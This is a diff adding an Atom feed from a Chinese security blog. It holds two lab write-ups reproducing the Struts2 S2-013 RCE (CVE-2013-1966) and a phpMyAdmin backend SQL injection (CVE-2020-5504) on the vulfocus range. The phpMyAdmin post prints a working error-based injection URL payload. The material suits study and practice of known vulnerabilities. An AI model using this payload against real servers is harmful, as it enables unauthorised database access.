@@ -1,0 +1,62 @@
+<?xml version="1.0"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://ch1e.gitee.io</id>
+    <title>ch1e的随笔 • Posts by &#34;漏洞复现&#34; tag</title>
+    <link href="https://ch1e.gitee.io" />
+    <updated>2021-10-21T06:42:56.655Z</updated>
+    <category term="CTF" />
+    <category term="靶场练习" />
+    <category term="web安全" />
+    <category term="免杀" />
+    <category term="渗透测试" />
+    <category term="数据库" />
+    <category term="代码审计" />
+    <category term="C++" />
+    <category term="漏洞复现" />
+    <category term="SQL注入" />
+    <category term="红队钓鱼" />
+    <category term="远程代码执行" />
+    <category term="内网渗透" />
+    <category term="网络协议" />
+    <entry>
+        <id>https://ch1e.gitee.io/2021/10/21/st-013/</id>
+        <title>Struts2-013RCE漏洞复现(CVE-2013-1966)</title>
+        <link rel="alternate" href="https://ch1e.gitee.io/2021/10/21/st-013/"/>
+        <content type="html">&lt;h1 id=&#34;Struts2-013RCE漏洞复现-CVE-2013-1966&#34;&gt;&lt;a href=&#34;#Struts2-013RCE漏洞复现-CVE-2013-1966&#34; class=&#34;headerlink&#34; title=&#34;Struts2-013RCE漏洞复现(CVE-2013-1966)&#34;&gt;&lt;/a&gt;Struts2-013RCE漏洞复现(CVE-2013-1966)&lt;/h1&gt;&lt;h1 id=&#34;影响版本&#34;&gt;&lt;a href=&#34;#影响版本&#34; class=&#34;headerlink&#34; title=&#34;影响版本&#34;&gt;&lt;/a&gt;&lt;strong&gt;影响版本&lt;/strong&gt;&lt;/h1&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Apache Group Struts 2.0.0 - 2.3.14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h1 id=&#34;漏洞描述&#34;&gt;&lt;a href=&#34;#漏洞描述&#34; class=&#34;headerlink&#34; title=&#34;漏洞描述&#34;&gt;&lt;/a&gt;漏洞描述&lt;/h1&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;CVE(CAN) ID: CVE-2013-1966&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Struts2 是第二代基于Model-View-Controller (MVC)模型的java企业级web应用框架。它是WebWork和Struts社区合并后的产物。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Apache Struts2的s:a和s:url标签都提供了一个includeParams属性。此属性允许使用的值包括none、get、all。当该属性被设置为get或all时，Apache Struts2会将用户提交的参数值作为Ognl表达式执行。攻击者可以提交带有恶意的Ongl表达式，达到执行任意Java代码的目的。只要基于Apache Struts2开发的JSP代码中使用了url/a标签并且设置了includeParams属性为all或get，远程攻击者即可利用此漏执行任意命令。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;复现地址:&lt;a href=&#34;http://vulfocus.fofa.so/&#34;&gt;http://vulfocus.fofa.so/&lt;/a&gt;&lt;/p&gt;
+&lt;h1 id=&#34;漏洞复现&#34;&gt;&lt;a href=&#34;#漏洞复现&#34; class=&#34;headerlink&#34; title=&#34;漏洞复现&#34;&gt;&lt;/a&gt;漏洞复现&lt;/h1&gt;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/ZwqGG/image/main/img/image-20211021144502977.png&#34; alt=&#34;image-20211021144502977&#34;&gt;&lt;/p&gt;
+&lt;p&gt;访问首页，点击”s:a”tag   &lt;a href=&#34;http://118.193.36.37:48931/link.action&#34;&gt;http://118.193.36.37:48931/link.action&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;直接使用Exp吧&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/ZwqGG/image/main/img/image-20211021144618353.png&#34; alt=&#34;image-20211021144618353&#34;&gt;&lt;/p&gt;
+</content>
+        <category term="靶场练习" />
+        <category term="web安全" />
+        <category term="漏洞复现" />
+        <category term="远程代码执行" />
+        <updated>2021-10-21T06:42:56.655Z</updated>
+    </entry>
+    <entry>
+        <id>https://ch1e.gitee.io/2021/10/21/phpmyadmin1/</id>
+        <title>phpmyadmin 后台sql注入漏洞复现（CVE-2020-5504）</title>
+        <link rel="alternate" href="https://ch1e.gitee.io/2021/10/21/phpmyadmin1/"/>
+        <content type="html">&lt;h1 id=&#34;phpmyadmin-后台sql注入漏洞复现（CVE-2020-5504）&#34;&gt;&lt;a href=&#34;#phpmyadmin-后台sql注入漏洞复现（CVE-2020-5504）&#34; class=&#34;headerlink&#34; title=&#34;phpmyadmin 后台sql注入漏洞复现（CVE-2020-5504）&#34;&gt;&lt;/a&gt;phpmyadmin 后台sql注入漏洞复现（CVE-2020-5504）&lt;/h1&gt;&lt;h1 id=&#34;影响版本&#34;&gt;&lt;a href=&#34;#影响版本&#34; class=&#34;headerlink&#34; title=&#34;影响版本&#34;&gt;&lt;/a&gt;&lt;strong&gt;影响版本&lt;/strong&gt;&lt;/h1&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Phpmyadmin &amp;lt;= 5.00&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Phpmyadmin &amp;lt;= 4.94&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h1 id=&#34;漏洞复现&#34;&gt;&lt;a href=&#34;#漏洞复现&#34; class=&#34;headerlink&#34; title=&#34;漏洞复现&#34;&gt;&lt;/a&gt;&lt;strong&gt;漏洞复现&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;复现地址:&lt;a href=&#34;http://vulfocus.fofa.so/&#34;&gt;http://vulfocus.fofa.so/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211021141143985.png&#34; alt=&#34;image-20211021141143985&#34;&gt;&lt;/p&gt;
+&lt;p&gt;拿到环境使用给出的账号密码进入后台，开启Burpsuite抓包，获取到一个token，保存下来&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211021141220287.png&#34; alt=&#34;image-20211021141220287&#34;&gt;&lt;/p&gt;
+&lt;p&gt;直接将请求的地址替换成poc即可。poc如下，记得需要替换token&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;server_privileges.php?ajax_request=true&amp;amp;validate_username=1&amp;amp;username=1&amp;#x27;and extractvalue(1,concat(0x7e,(select user()),0x7e))--+db=&amp;amp;token=3c7c5b2b7f3a7621394d6c733e35705f&amp;amp;viewing_mode=server&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211021141407302.png&#34; alt=&#34;image-20211021141407302&#34;&gt;&lt;/p&gt;
+</content>
+        <category term="靶场练习" />
+        <category term="web安全" />
+        <category term="漏洞复现" />
+        <category term="SQL注入" />
+        <updated>2021-10-21T06:10:08.079Z</updated>
+    </entry>
+</feed>
